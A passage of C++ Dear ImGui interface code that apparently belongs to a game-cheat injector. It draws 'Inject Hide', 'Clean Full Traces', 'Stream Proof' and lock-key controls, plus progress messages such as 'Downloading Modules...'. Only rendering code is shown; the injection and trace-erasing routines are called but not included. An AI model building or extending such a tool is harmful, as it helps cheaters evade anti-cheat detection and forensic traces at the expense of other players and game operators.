    ::SetWindowPos(hWnd, nullptr, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
}

static float Clamp01(float x) { return x < 0.0f ? 0.0f : (x > 1.0f ? 1.0f : x); }
static float EaseSmooth(float x) { return x * x * (3.0f - 2.0f * x); }

static float AnimDeltaTime() {
    return fminf(ImGui::GetIO().DeltaTime, 1.0f / 30.0f);
}

static void DrawTextGlow(ImDrawList* draw, ImFont* font, float size, const ImVec2& pos,
    ImU32 col, const char* text) {
    const int colA = (int)((col >> 24) & 0xFF);
    const int haloA = (colA * 14) / 100;
    const ImU32 halo = (col & 0x00FFFFFF) | ((ImU32)haloA << 24);
    static const float offs[4][2] = {
        { 0.5f, 0.0f }, { -0.5f, 0.0f }, { 0.0f, 0.5f }, { 0.0f, -0.5f }
    };
    for (int i = 0; i < 4; ++i)
        draw->AddText(font, size, ImVec2(pos.x + offs[i][0], pos.y + offs[i][1]), halo, text);
    draw->AddText(font, size, pos, col, text);
}

void DrawWindowButtons(ImDrawList* draw, const ImVec2& p, const ImVec2& q,
    HWND hWnd, ImVec2& exMin, ImVec2& exMax) {
    const float radius = 14.0f;
    const float margin = 10.0f;
    const float gap = 12.0f;
    const float cy = p.y + margin + radius;

    const float closeCx = q.x - margin - radius;
    const float minCx = closeCx - radius * 2.0f - gap;

    static float s_closeAnim = 0.0f;
    static float s_minAnim = 0.0f;

    {
        ImGui::SetCursorScreenPos(ImVec2(minCx - radius, cy - radius));
        ImGui::InvisibleButton("##minimize", ImVec2(radius * 2.0f, radius * 2.0f));
        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
        if (ImGui::IsItemClicked())
            ::ShowWindow(hWnd, SW_MINIMIZE);

        const float dt = AnimDeltaTime();
        const float target = hovered ? 1.0f : 0.0f;
        if (s_minAnim < target) s_minAnim = fminf(target, s_minAnim + dt * 8.0f);
        else                    s_minAnim = fmaxf(target, s_minAnim - dt * 10.0f);

        const float t = EaseSmooth(s_minAnim);
        const ImVec2 c(minCx, cy);

        const float halfW = radius * 0.55f;
        const float thick = 2.0f;

        const int bright = (int)(180.0f + 75.0f * t);
        const ImU32 col = IM_COL32(bright, bright, bright, 255);

        if (t > 0.01f) {
            for (int i = 3; i >= 1; --i) {
                const float g = (float)i * 0.8f;
                const ImU32 halo = IM_COL32(255, 255, 255, (int)(22.0f * t / (float)i));
                draw->AddLine(ImVec2(c.x - halfW, c.y + g),
                    ImVec2(c.x + halfW, c.y + g), halo, thick + g * 2.0f);
            }
        }

        draw->AddLine(ImVec2(c.x - halfW, c.y),
            ImVec2(c.x + halfW, c.y), col, thick);
        draw->AddCircleFilled(ImVec2(c.x - halfW, c.y), thick * 0.5f, col);
        draw->AddCircleFilled(ImVec2(c.x + halfW, c.y), thick * 0.5f, col);
    }

    {
        ImGui::SetCursorScreenPos(ImVec2(closeCx - radius, cy - radius));
        ImGui::InvisibleButton("##close", ImVec2(radius * 2.0f, radius * 2.0f));
        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
        if (ImGui::IsItemClicked())
            g_running = false;

        const float dt = AnimDeltaTime();
        const float target = hovered ? 1.0f : 0.0f;
        if (s_closeAnim < target) s_closeAnim = fminf(target, s_closeAnim + dt * 8.0f);
        else                      s_closeAnim = fmaxf(target, s_closeAnim - dt * 10.0f);

        const float t = EaseSmooth(s_closeAnim);
        const ImVec2 c(closeCx, cy);

        const float xr = radius * 0.42f;
        const float thick = 2.0f;

        const int bright = (int)(180.0f + 75.0f * t);
        const ImU32 col = IM_COL32(bright, bright, bright, 255);

        const ImVec2 a0(c.x - xr, c.y - xr);
        const ImVec2 a1(c.x + xr, c.y + xr);
        const ImVec2 b0(c.x - xr, c.y + xr);
        const ImVec2 b1(c.x + xr, c.y - xr);

        if (t > 0.01f) {
            for (int i = 3; i >= 1; --i) {
                const float g = (float)i * 0.6f;
                const ImU32 halo = IM_COL32(255, 255, 255, (int)(22.0f * t / (float)i));
                draw->AddLine(ImVec2(a0.x - g, a0.y), ImVec2(a1.x - g, a1.y), halo, thick + g * 2.0f);
                draw->AddLine(ImVec2(a0.x + g, a0.y), ImVec2(a1.x + g, a1.y), halo, thick + g * 2.0f);
                draw->AddLine(ImVec2(a0.x, a0.y - g), ImVec2(a1.x, a1.y - g), halo, thick + g * 2.0f);
                draw->AddLine(ImVec2(a0.x, a0.y + g), ImVec2(a1.x, a1.y + g), halo, thick + g * 2.0f);
            }
        }

        draw->AddLine(a0, a1, col, thick);
        draw->AddLine(b0, b1, col, thick);

        draw->AddCircleFilled(a0, thick * 0.5f, col);
        draw->AddCircleFilled(a1, thick * 0.5f, col);
        draw->AddCircleFilled(b0, thick * 0.5f, col);
        draw->AddCircleFilled(b1, thick * 0.5f, col);
    }

    exMin = ImVec2(minCx - radius, cy - radius);
    exMax = ImVec2(closeCx + radius, cy + radius);

    ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow);
}

static int   s_injectMode = 0;
static int   s_injectPrev = 0;
static float s_injectAnim = 1.0f;
static const char* kInjectLabels[2] = { "Inject Hide", "Inject Normal" };
static float s_injectSheen = 0.0f;

static int   s_cleanMode = 0;
static int   s_cleanPrev = 0;
static float s_cleanAnim = 1.0f;
static float s_cleanSheen = 0.0f;
static const char* kCleanLabels[2] = { "Clean Full Traces", "Clean Traces" };

static bool  s_injectActive = false;
static float s_injectElapsed = 0.0f;
static float s_injectPostDone = 0.0f;
static const float kInjectPostDoneGrace = 3.0f;
static bool  s_menuOpen = false;

static bool  s_cleanActive = false;
static float s_cleanElapsed = 0.0f;
static float s_cleanPostDone = 0.0f;
static const float kCleanPostDoneGrace = 3.0f;
static bool  s_cleanMenuOpen = false;

static float FitTextSize(ImFont* font, const char* text, float maxSize, float availW) {
    const float w = font->CalcTextSizeA(maxSize, FLT_MAX, 0.0f, text).x;
    if (w <= availW || w <= 0.0f) return maxSize;
    return maxSize * (availW / w);
}

static void DrawSpinner(ImDrawList* draw, const ImVec2& c, float r, float phase, ImU32 col) {
    const int   seg = 28;
    const float kSpan = 4.712389f;
    ImVec2 pts[seg + 1];
    for (int i = 0; i <= seg; ++i) {
        const float a = phase + kSpan * ((float)i / (float)seg);
        pts[i] = ImVec2(c.x + cosf(a) * r, c.y + sinf(a) * r);
    }
    draw->AddPolyline(pts, seg + 1, col, 0, 2.0f);
}

static void DrawSwapIcon(ImDrawList* draw, const ImVec2& c, float r, ImU32 col, float rot) {
    const float kSpan = 112.0f * 0.0174533f;
    const float kHead = 2.6f;
    const float kThick = 1.5f;
    const int   kSeg = 12;

    for (int k = 0; k < 2; ++k) {
        const float a0 = rot + (float)k * 3.14159265f;

        ImVec2 pts[kSeg + 1];
        for (int i = 0; i <= kSeg; ++i) {
            const float a = a0 + kSpan * ((float)i / (float)kSeg);
            pts[i] = ImVec2(c.x + cosf(a) * r, c.y + sinf(a) * r);
        }
        draw->AddPolyline(pts, kSeg + 1, col, 0, kThick);

        const float a1 = a0 + kSpan;
        const ImVec2 p(c.x + cosf(a1) * r, c.y + sinf(a1) * r);
        const ImVec2 tg(-sinf(a1), cosf(a1));
        const ImVec2 nr(cosf(a1), sinf(a1));
        const ImVec2 apex(p.x + tg.x * kHead * 1.15f, p.y + tg.y * kHead * 1.15f);
        const ImVec2 b1(p.x + nr.x * kHead * 0.62f, p.y + nr.y * kHead * 0.62f);
        const ImVec2 b2(p.x - nr.x * kHead * 0.62f, p.y - nr.y * kHead * 0.62f);
        draw->AddTriangleFilled(apex, b1, b2, col);
    }
}

static void AddRoundedSheen(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    float rounding, float centerX, float halfW, ImU32 rgb, float opacity) {
    if (opacity <= 0.001f || halfW <= 0.0f) return;
    rgb &= 0x00FFFFFFu;

    const int y0 = (int)floorf(mn.y);
    const int y1 = (int)ceilf(mx.y);
    const float topCY = mn.y + rounding;
    const float botCY = mx.y - rounding;

    for (int y = y0; y < y1; ++y) {
        const float py = (float)y + 0.5f;
        float rx0 = mn.x, rx1 = mx.x;
        if (py < topCY) {
            const float dy = topCY - py;
            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
            rx0 = mn.x + rounding - dx;
            rx1 = mx.x - rounding + dx;
        }
        else if (py > botCY) {
            const float dy = py - botCY;
            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
            rx0 = mn.x + rounding - dx;
            rx1 = mx.x - rounding + dx;
        }

        const float x0 = fmaxf(rx0, centerX - halfW);
        const float x1 = fminf(rx1, centerX + halfW);
        if (x1 <= x0) continue;

        auto alphaAt = [&](float x) {
            const float k = 1.0f - fabsf(x - centerX) / halfW;
            return (int)(255.0f * opacity * EaseSmooth(Clamp01(k)));
            };
        const ImU32 c0 = rgb | ((ImU32)alphaAt(x0) << 24);
        const ImU32 c1 = rgb | ((ImU32)alphaAt(x1) << 24);
        draw->AddRectFilledMultiColor(ImVec2(x0, (float)y), ImVec2(x1, (float)y + 1.0f),
            c0, c1, c1, c0);
    }
}

void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    const float kRound = 6.0f;
    const float kSize = 17.0f;
    const float kIconZone = 20.0f;
    const float kSwapTime = 0.26f;

    outMin = mn;
    outMax = mx;

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    if (s_injectActive) {
        s_injectElapsed += AnimDeltaTime();
        const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
        if (done) {
            s_injectPostDone += AnimDeltaTime();
            if (s_injectPostDone >= kInjectPostDoneGrace) {
                s_injectActive = false;
                s_menuOpen = false;
            }
        }
    }
    const bool busy = s_injectActive;

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##inject", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);

    const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);

    if (ImGui::IsItemClicked() && !busy && !s_cleanActive) {
        if (overIcon) {
            s_injectPrev = s_injectMode;
            s_injectMode = 1 - s_injectMode;
            s_injectAnim = 0.0f;
        }
        else {
            s_injectingMode = s_injectMode;
            s_injectActive = true;
            s_injectElapsed = 0.0f;
            s_injectPostDone = 0.0f;
            s_menuOpen = true;
            s_cleanMenuOpen = false;
            LaunchInstallerAsync();
        }
    }

    const float radius = 0.0f;

    const float sheenTarget = hovered ? 1.0f : 0.0f;
    const float sheenStep = AnimDeltaTime() * 8.0f;
    if (s_injectSheen < sheenTarget)
        s_injectSheen = fminf(sheenTarget, s_injectSheen + sheenStep);
    else if (s_injectSheen > sheenTarget)
        s_injectSheen = fmaxf(sheenTarget, s_injectSheen - sheenStep);

    if (s_injectSheen > 0.001f) {
        for (int i = 3; i >= 1; --i) {
            const float g = (float)i * 1.5f;
            draw->AddRectFilled(ImVec2(mn.x - g, mn.y - g),
                ImVec2(mx.x + g, mx.y + g),
                IM_COL32(255, 255, 255,
                    (int)(22.0f * EaseSmooth(s_injectSheen) / (float)i)),
                kRound + g);
        }
    }

    const ImU32 face = pressed ? IM_COL32(24, 25, 29, 255)
        : (hovered ? IM_COL32(19, 20, 24, 255) : IM_COL32(30, 30, 30, 255));
    draw->AddRectFilled(mn, mx, face, kRound);

    if (s_injectSheen > 0.001f) {
        const float W = mx.x - mn.x;
        const float cycle = W + 150.0f;
        const float sheenX = mn.x - 75.0f +
            fmodf((float)ImGui::GetTime() * 105.0f, cycle);
        AddRoundedSheen(draw, ImVec2(mn.x + 1.0f, mn.y + 1.0f),
            ImVec2(mx.x - 1.0f, mx.y - 1.0f), kRound - 1.0f,
            sheenX, 62.0f, IM_COL32(255, 255, 255, 0),
            0.28f * EaseSmooth(s_injectSheen));
    }

    draw->AddRect(mn, mx,
        IM_COL32(255, 255, 255,
            (int)(70.0f + 105.0f * EaseSmooth(s_injectSheen))),
        kRound, 0, 1.0f);

    const ImVec2 cc(mn.x + (mx.x - mn.x) * 0.5f, mn.y + (mx.y - mn.y) * 0.5f);

    if (s_injectAnim < 1.0f)
        s_injectAnim = Clamp01(s_injectAnim + AnimDeltaTime() / kSwapTime);
    const float ap = EaseSmooth(s_injectAnim);

    const float H = mx.y - mn.y;
    const ImVec2 tMin(mn.x + 10.0f, mn.y);
    const ImVec2 tMax(mx.x - kIconZone, mx.y);

    const float availW = tMax.x - tMin.x;
    const float parkedSize = fminf(FitTextSize(font, kInjectLabels[0], kSize, availW),
        FitTextSize(font, kInjectLabels[1], kSize, availW));
    auto drawFitted = [&](const char* txt, float maxSize, float dy, float alpha) {
        const float size = FitTextSize(font, txt, maxSize, availW);
        const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
        const ImVec2 tp(tMin.x, mn.y + (H - ts.y) * 0.5f + dy);

        const ImVec2 tc(tp.x + ts.x * 0.5f, tp.y + ts.y * 0.5f);
        const float textDist = sqrtf((tc.x - cc.x) * (tc.x - cc.x) +
            (tc.y - cc.y) * (tc.y - cc.y));
        const float textMix = EaseSmooth(Clamp01((radius - textDist + 6.0f) / 12.0f));
        const int shade = (int)(255.0f + (12.0f - 255.0f) * textMix);
        draw->AddText(font, size, tp,
            IM_COL32(shade, shade, shade, (int)(255.0f * Clamp01(alpha))), txt);
        };

    draw->PushClipRect(tMin, tMax, true);
    if (busy) {
        char buf[64];
        wsprintfA(buf, "%s...", kInjectLabels[s_injectingMode]);
        drawFitted(buf, kSize, 0.0f, 1.0f);
    }
    else if (s_injectAnim < 1.0f) {
        drawFitted(kInjectLabels[s_injectPrev], parkedSize, -ap * H, 1.0f);
        drawFitted(kInjectLabels[s_injectMode], parkedSize, (1.0f - ap) * H, 1.0f);
    }
    else {
        drawFitted(kInjectLabels[s_injectMode], parkedSize, 0.0f, 1.0f);
    }
    draw->PopClipRect();

    const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
    const float rot = busy
        ? (s_injectElapsed / 1.8f) * 6.2831853f
        : ap * 3.14159265f;
    const float iconDist = sqrtf((ic.x - cc.x) * (ic.x - cc.x) +
        (ic.y - cc.y) * (ic.y - cc.y));
    const float iconMix = EaseSmooth(Clamp01((radius - iconDist + 4.0f) / 8.0f));
    const int iconShade = (int)(255.0f + (12.0f - 255.0f) * iconMix);
    DrawSwapIcon(draw, ic, 5.0f,
        IM_COL32(iconShade, iconShade, iconShade, 255), rot);
}

void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    const float kRound = 6.0f;
    const float kSize = 17.0f;
    const float kIconZone = 20.0f;
    const float kSwapTime = 0.26f;

    outMin = mn;
    outMax = mx;
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    if (s_cleanActive) {
        s_cleanElapsed += AnimDeltaTime();
        const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
        if (done) {
            s_cleanPostDone += AnimDeltaTime();
            if (s_cleanPostDone >= kCleanPostDoneGrace) {
                s_cleanActive = false;
                s_cleanMenuOpen = false;
            }
        }
    }
    const bool busy = s_cleanActive;

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##clean_traces", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);

    if (ImGui::IsItemClicked() && !busy && !s_injectActive) {
        if (overIcon) {
            s_cleanPrev = s_cleanMode;
            s_cleanMode = 1 - s_cleanMode;
            s_cleanAnim = 0.0f;
        }
        else {
            s_cleaningMode = s_cleanMode;
            s_cleanActive = true;
            s_cleanElapsed = 0.0f;
            s_cleanPostDone = 0.0f;
            s_cleanMenuOpen = true;
            s_menuOpen = false;
            CleanTracesAsync();
        }
    }

    if (s_cleanAnim < 1.0f)
        s_cleanAnim = Clamp01(s_cleanAnim + AnimDeltaTime() / kSwapTime);
    const float ap = EaseSmooth(s_cleanAnim);

    const float sheenTarget = hovered ? 1.0f : 0.0f;
    const float sheenStep = AnimDeltaTime() * 8.0f;
    if (s_cleanSheen < sheenTarget)
        s_cleanSheen = fminf(sheenTarget, s_cleanSheen + sheenStep);
    else if (s_cleanSheen > sheenTarget)
        s_cleanSheen = fmaxf(sheenTarget, s_cleanSheen - sheenStep);

    if (s_cleanSheen > 0.001f) {
        for (int i = 3; i >= 1; --i) {
            const float g = (float)i * 1.5f;
            draw->AddRectFilled(ImVec2(mn.x - g, mn.y - g),
                ImVec2(mx.x + g, mx.y + g),
                IM_COL32(255, 255, 255,
                    (int)(22.0f * EaseSmooth(s_cleanSheen) / (float)i)),
                kRound + g);
        }
    }

    const ImU32 face = pressed ? IM_COL32(24, 25, 29, 255)
        : (hovered ? IM_COL32(19, 20, 24, 255) : IM_COL32(30, 30, 30, 255));
    draw->AddRectFilled(mn, mx, face, kRound);

    if (s_cleanSheen > 0.001f) {
        const float W = mx.x - mn.x;
        const float cycle = W + 150.0f;
        const float sheenX = mn.x - 75.0f +
            fmodf((float)ImGui::GetTime() * 105.0f + 80.0f, cycle);
        AddRoundedSheen(draw, ImVec2(mn.x + 1.0f, mn.y + 1.0f),
            ImVec2(mx.x - 1.0f, mx.y - 1.0f), kRound - 1.0f,
            sheenX, 62.0f, IM_COL32(255, 255, 255, 0),
            0.28f * EaseSmooth(s_cleanSheen));
    }

    draw->AddRect(mn, mx,
        IM_COL32(255, 255, 255,
            (int)(70.0f + 105.0f * EaseSmooth(s_cleanSheen))),
        kRound, 0, 1.0f);

    const float H = mx.y - mn.y;
    const ImVec2 tMin(mn.x + 10.0f, mn.y);
    const ImVec2 tMax(mx.x - kIconZone, mx.y);
    const float availW = tMax.x - tMin.x;
    const float parkedSize = fminf(FitTextSize(font, kCleanLabels[0], kSize, availW),
        FitTextSize(font, kCleanLabels[1], kSize, availW));

    auto drawLabel = [&](const char* txt, float maxSize, float dy) {
        const float size = FitTextSize(font, txt, maxSize, availW);
        const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
        const ImVec2 tp(tMin.x, mn.y + (H - ts.y) * 0.5f + dy);
        draw->AddText(font, size, tp, IM_COL32(255, 255, 255, 255), txt);
        };

    draw->PushClipRect(tMin, tMax, true);
    if (busy) {
        char buf[64];
        wsprintfA(buf, "%s...", kCleanLabels[s_cleaningMode]);
        drawLabel(buf, kSize, 0.0f);
    }
    else if (s_cleanAnim < 1.0f) {
        drawLabel(kCleanLabels[s_cleanPrev], parkedSize, -ap * H);
        drawLabel(kCleanLabels[s_cleanMode], parkedSize, (1.0f - ap) * H);
    }
    else {
        drawLabel(kCleanLabels[s_cleanMode], parkedSize, 0.0f);
    }
    draw->PopClipRect();

    const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
    const float rot = busy
        ? (s_cleanElapsed / 1.8f) * 6.2831853f
        : ap * 3.14159265f;
    DrawSwapIcon(draw, ic, 5.0f, IM_COL32(255, 255, 255, 255), rot);
}

void DrawStreamProofCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    outMin = mn;
    outMax = mx;

    const float dt = AnimDeltaTime();
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##stream_proof", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    if (ImGui::IsItemClicked()) {
        s_streamProof = !s_streamProof;
        ApplyStreamProof();
    }

    const float hoverTarget = hovered ? 1.0f : 0.0f;
    const float checkTarget = s_streamProof ? 1.0f : 0.0f;
    const float hoverStep = dt * 8.0f;
    const float checkStep = dt * 6.5f;
    if (s_streamProofHover < hoverTarget)
        s_streamProofHover = fminf(hoverTarget, s_streamProofHover + hoverStep);
    else
        s_streamProofHover = fmaxf(hoverTarget, s_streamProofHover - hoverStep);
    if (s_streamProofAnim < checkTarget)
        s_streamProofAnim = fminf(checkTarget, s_streamProofAnim + checkStep);
    else
        s_streamProofAnim = fmaxf(checkTarget, s_streamProofAnim - checkStep);

    const float ht = EaseSmooth(s_streamProofHover);
    const float ct = EaseSmooth(s_streamProofAnim);
    const float at = fmaxf(ht, ct);

    const float boxSize = 16.0f + ct * 1.5f;
    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
    const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
    const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);

    const float glow = fmaxf(ht * 0.65f, ct);
    if (glow > 0.001f)
        draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
            ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
            IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);

    const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
        : IM_COL32(12, 13, 16, 255);
    draw->AddRectFilled(b0, b1, boxBg, 4.0f);

    draw->AddRect(b0, b1,
        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
        4.0f, 0, 1.0f);

    if (ct > 0.001f) {
        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
        const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
        const float thick = 2.2f;
        const float capR = thick * 0.5f;
        const float kFirst = 0.38f;

        ImVec2 pts[3];
        int n = 0;
        pts[n++] = a;
        if (ct < kFirst) {
            const float f = EaseSmooth(ct / kFirst);
            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
        }
        else {
            pts[n++] = b;
            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
        }

        draw->AddPolyline(pts, n, checkCol, 0, thick);
        draw->AddCircleFilled(a, capR, checkCol);
        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
    }

    const char* label = "Stream Proof";
    const float textSize = 13.0f;
    const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
    draw->AddText(font, textSize, tp,
        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
}

void DrawLockKeyCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    outMin = mn;
    outMax = mx;

    const float dt = AnimDeltaTime();
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##lock_key", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    if (ImGui::IsItemClicked())
        s_lockKey = !s_lockKey;

    const float hoverTarget = hovered ? 1.0f : 0.0f;
    const float checkTarget = s_lockKey ? 1.0f : 0.0f;
    const float hoverStep = dt * 8.0f;
    const float checkStep = dt * 6.5f;
    if (s_lockKeyHover < hoverTarget)
        s_lockKeyHover = fminf(hoverTarget, s_lockKeyHover + hoverStep);
    else
        s_lockKeyHover = fmaxf(hoverTarget, s_lockKeyHover - hoverStep);
    if (s_lockKeyAnim < checkTarget)
        s_lockKeyAnim = fminf(checkTarget, s_lockKeyAnim + checkStep);
    else
        s_lockKeyAnim = fmaxf(checkTarget, s_lockKeyAnim - checkStep);

    const float ht = EaseSmooth(s_lockKeyHover);
    const float ct = EaseSmooth(s_lockKeyAnim);
    const float at = fmaxf(ht, ct);

    const float boxSize = 16.0f + ct * 1.5f;
    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
    const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
    const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);

    const float glow = fmaxf(ht * 0.65f, ct);
    if (glow > 0.001f)
        draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
            ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
            IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);

    const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
        : IM_COL32(12, 13, 16, 255);
    draw->AddRectFilled(b0, b1, boxBg, 4.0f);

    draw->AddRect(b0, b1,
        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
        4.0f, 0, 1.0f);

    if (ct > 0.001f) {
        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
        const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
        const float thick = 2.2f;
        const float capR = thick * 0.5f;
        const float kFirst = 0.38f;

        ImVec2 pts[3];
        int n = 0;
        pts[n++] = a;
        if (ct < kFirst) {
            const float f = EaseSmooth(ct / kFirst);
            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
        }
        else {
            pts[n++] = b;
            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
        }

        draw->AddPolyline(pts, n, checkCol, 0, thick);
        draw->AddCircleFilled(a, capR, checkCol);
        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
    }

    const char* label = "Lock Key (Del)";
    const float textSize = 13.0f;
    const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
    draw->AddText(font, textSize, tp,
        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
}

void DrawInjectMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
    if (!s_menuOpen) return;

    const bool wasCached = ::InterlockedCompareExchange(&g_installerWasCached, 0, 0) == 1;
    const bool hadRunning = ::InterlockedCompareExchange(&g_installerHadRunning, 0, 0) == 1;
    const bool slept = ::InterlockedCompareExchange(&g_installerSlept, 0, 0) == 1;
    const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
    const bool failed = ::InterlockedCompareExchange(&g_installerFailed, 0, 0) == 1;

    const float fade = fminf(1.0f, s_injectElapsed * 8.0f);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);

    const float w = 236.0f, h = 96.0f;
    const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
    const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
    const ImVec2 mx(c.x + w * 0.5f, c.y + h * 0.5f);
    const float round = 12.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
    draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);

    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
        IM_COL32(255, 255, 255, (int)(240.0f * fade)));

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    const char* txt = nullptr;
    if (failed)
        txt = "Inject Failed.";
    else if (slept)
        txt = "Entre No Jogo e Farme Aura!";
    else if (hadRunning)
        txt = "Attaching to Background App...";
    else if (!wasCached && !done)
        txt = "Downloading Modules...";
    else
        txt = "Injecting...";

    const float size = 14.0f;
    const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
    draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 60.0f),
        IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);
}

void DrawCleanMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
    if (!s_cleanMenuOpen) return;

    const LONG stage = ::InterlockedCompareExchange(&g_cleanStage, 0, 0);
    const bool found = ::InterlockedCompareExchange(&g_cleanFound, 0, 0) == 1;
    const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
    const bool failed = ::InterlockedCompareExchange(&g_cleanFailed, 0, 0) == 1;

    const float fade = fminf(1.0f, s_cleanElapsed * 8.0f);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);

    const float w = 236.0f, h = 96.0f;
    const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
    const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
    const ImVec2 mx(c.x + w * 0.5f, c.y + h * 0.5f);
    const float round = 12.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
    draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);

    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
        IM_COL32(255, 255, 255, (int)(240.0f * fade)));

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

